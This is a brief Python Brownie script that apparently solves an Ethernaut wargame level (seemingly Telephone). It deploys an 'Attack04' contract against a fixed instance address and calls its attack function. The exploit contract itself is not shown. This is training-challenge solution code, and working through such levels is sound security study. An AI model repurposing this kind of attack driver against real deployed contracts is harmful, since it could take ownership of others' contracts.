from scripts.helpful_scripts import get_account
from brownie import interface, Attack04

ETHERNAUT_INSTANCE = "0x05324798452fc61A5163216AFFFcDa2C8024DF0C"


def main():

    player = get_account()

    attacker_contract = Attack04.deploy(ETHERNAUT_INSTANCE, {"from": player})

    print(f"attack contract deployed: {attacker_contract}")

    attacker_contract.attack({"from": player})

    # owner = telphone_interface.owner()

    # print("Player is ", player)
    # print("Owner is", owner)
